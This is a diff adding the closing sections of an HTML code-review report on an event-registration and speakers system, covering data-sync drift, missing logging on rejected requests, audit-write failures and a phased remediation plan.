+      <td><strong><code>create_speakers_bulk</code> skips <code>syncToContact</code></strong> and drops <code>role</code>, <code>country</code>, <code>city</code>, <code>state</code>, <code>zipCode</code>, <code>photo</code>, <code>additionalEmail</code>, <code>tags</code>. The registrations twin does sync, under a comment naming this exact bug class. The speakers CSV import also skips it.</td>
+      <td>A 100-row agent import never reaches the org Contact store; companions get null <code>country</code> (blank badge line) and null <code>registrationType</code> — re-creating the "unknown-profession faculty" class the July backfill just cleaned up.</td>
+    </tr>
+    <tr>
+      <td>M10</td><td><span class="sev medium">Med</span></td>
+      <td><strong><code>bulk_update_registration_status</code></strong> is a fourth hand-written copy of the cancel/reactivate policy (~90 lines), with two near-identical 20-line claim blocks for tier vs ticketType.</td>
+      <td>Any future capacity-semantics change needs four edits. Tracked as ROADMAP #6; status unchanged.</td>
+    </tr>
+    <tr>
+      <td>M11</td><td><span class="sev medium">Med</span></td>
+      <td><strong>Create-time seat claim hand-rolled in three more places</strong> instead of <code>claimSeat</code>: <code>registration-service.ts:626</code>, MCP bulk create, public register (both tier and ticketType branches).</td>
+      <td>Functionally equivalent today; four edit sites for one semantic.</td>
+    </tr>
+    <tr>
+      <td>L4</td><td><span class="sev low">Low</span></td>
+      <td><strong>Empty-string normalization drifts.</strong> REST + services collapse <code>""</code> → <code>null</code>; MCP <em>updates</em> persist <code>""</code>.</td>
+      <td>Contact-sync skips <code>""</code>, so the Contact keeps the old value while the entity row shows blank; downstream truthiness checks behave differently depending on which entry point last wrote.</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="note warn">
+  <strong>The pattern to internalise.</strong> Extractions <em>hold</em>. But fixes applied <em>after</em> an
+  extraction keep landing on only one copy of the still-mirrored shell — the sponsor gate, the payment-gated
+  check-in, and the tag sync are three independent instances of the same decay. That is the strongest argument
+  for finishing the <code>registration-service.updateRegistration()</code> extraction (ROADMAP #5) and giving
+  check-in a single home.
+</div>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<h2 id="visibility">6. Failure visibility</h2>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M12 — REST boundaries return service rejections as 4xx without logging</h3>
+  <p class="loc"><code>registrations/route.ts:351-357</code> · <code>speakers/route.ts:186-192</code> · <code>public/register/route.ts:241-267</code></p>
+<pre><code>if (!result.ok) {
+  const status = HTTP_STATUS_FOR_REGISTRATION_ERROR[result.code] ?? 500;
+  return NextResponse.json({ error: result.message, code: result.code }, { status });   // no log
+}</code></pre>
+  <p>
+    The service logs only <code>UNKNOWN</code> / transaction failures. <code>SOLD_OUT</code>,
+    <code>ALREADY_REGISTERED</code>, <code>SALES_ENDED</code>, <code>SALES_NOT_STARTED</code>,
+    <code>TICKET_TYPE_NOT_FOUND</code>, <code>PRICING_TIER_NOT_FOUND</code>,
+    <code>INVALID_PAYMENT_STATUS</code>, <code>INCLUSIVE_REQUIRES_SPONSOR</code>,
+    <code>SPONSOR_NOT_FOUND</code> and both <code>BILLING_ACCOUNT_*</code> codes return
+    <strong>unlogged end-to-end</strong>, violating convention #10 verbatim. The MCP path is covered centrally by
+    the <code>runTool</code> wrapper — <em>only REST is dark</em>. On the public revenue path,
+    <code>register/route.ts</code> returns "Pricing tier not found", "sales have not started" and "Sold out" with
+    zero logging, while the memberId/studentId 400s ten lines below all warn-log. Desk staff reporting
+    "it says sold out" during a live sales window leaves nothing in <code>/logs</code> to correlate.
+  </p>
+</div>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M13 — Awaited audit writes turn insert blips into 500s on already-committed operations</h3>
+  <p class="loc"><code>[registrationId]/route.ts:690, 945</code> · <code>check-in/route.ts:94, 225</code> · <code>speakers/[speakerId]/route.ts:318</code></p>
+  <p>
+    Every service and MCP tool treats the audit write as fire-and-forget with a logged <code>.catch</code>.
+    These five REST sites bare-<code>await</code> it inside the try. A transient audit failure — the P2024
+    pool-timeout class this box has already hit — <em>after</em> the registration update / delete / check-in has
+    committed propagates to the outer catch and returns <code>500 "Failed to check in"</code>.
+  </p>
+  <p>
+    At the door: check-in commits, the audit insert times out, the desk sees a failure, re-scans, gets
+    <code>400 "Already checked in"</code>, and the operator concludes the scanner is broken mid-event.
+    The DELETE route's own <code>DELETE_BLOCKED</code> branch already does this correctly, three screens above
+    the unprotected one.
+  </p>
+</div>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<h2 id="plan">7. Remediation plan</h2>
+
+<p>All nine HIGHs are being fixed in eight phases, each independently verified
+(<code>tsc</code> → <code>lint</code> → <code>vitest</code> → <code>build</code>) and pushed separately.</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>Phase</th><th>Findings</th><th>Change</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td>H1</td><td>Route both <code>/activity</code> lookups through <code>buildEventAccessWhere</code>; add <code>denyReviewer</code>; regression test for the org-null role.</td></tr>
+    <tr><td>2</td><td>H2</td><td>Shared <code>escapeCsvCell()</code> with formula neutralisation; applied to every export path.</td></tr>
+    <tr><td>3</td><td>H3, H4</td><td>Companion link excludes CANCELLED and prefers active rows; registration email PATCH cascades to the Speaker facet.</td></tr>
+    <tr><td>4</td><td>H5</td><td>MCP <code>update_speaker</code> / <code>update_registration</code> route tag writes through <code>person-tag-sync</code>.</td></tr>
+    <tr><td>5</td><td>H6</td><td>Guard the promo decrement (<code>usedCount &gt; 0</code>); re-claim on reactivation; make cancel/reactivate symmetric.</td></tr>
+    <tr><td>6</td><td>H7</td><td>Move the attendee update and contact sync inside the transaction, after the optimistic-lock check.</td></tr>
+    <tr><td>7</td><td>H8</td><td>Bulk-type re-stamps <code>originalPrice</code> and enforces the unpaid / no-discount guards.</td></tr>
+    <tr><td>8</td><td>H9</td><td>Single check-in helper shared by both REST handlers and the MCP tool: payment gate, audit row, and the CANCELLED override routed through <code>applyRegistrationTransition</code>.</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  The 11 mediums and 4 lows are recorded in <code>docs/ROADMAP.md</code> under
+  <em>"Registrations &amp; speakers review (July 10, 2026) — deferred findings"</em>, each with its file
+  reference and failure scenario, ready to schedule.
+</p>
+
+<h3>Suggested ordering for the deferred work</h3>
+<ol>
+  <li><strong>M4 (multi-payment refund routing)</strong> — the only deferred finding that can move real money incorrectly. Do it next.</li>
+  <li><strong>M7 + M8 + M9 + L4 as one "MCP parity" round</strong> — they share a root cause and a fix location.</li>
+  <li><strong>M12 + M13 (logging hygiene)</strong> — small, mechanical, and they make every future incident diagnosable.</li>
+  <li><strong>ROADMAP #5 <code>updateRegistration()</code> service extraction</strong> — the structural fix that stops the drift class from regenerating. Schedule it before adding another registration write path.</li>
+  <li><strong>M2, M3, L2 (companion lifecycle)</strong> — bundle with the next speaker-domain feature.</li>
+  <li><strong>M1, M5, M6, M10, M11, L1, L3</strong> — hygiene; safe to batch.</li>
+</ol>
+
+<footer>
+  Generated from four independent review passes over <code>main</code> @ <code>598839b</code>.<br />
+  Findings already tracked in <code>docs/ROADMAP.md</code> were excluded by design.
+  Two candidate findings were investigated and <strong>refuted</strong> against source, and are not listed:
+  the ONSITE desk-route isolation is correctly applied on all five routes, and every <code>.catch(() =&gt;</code>
+  in scope is either a benign <code>req.json()</code> fallback or a logged handler.
+</footer>
+
+</div>
+</body>
+</html>
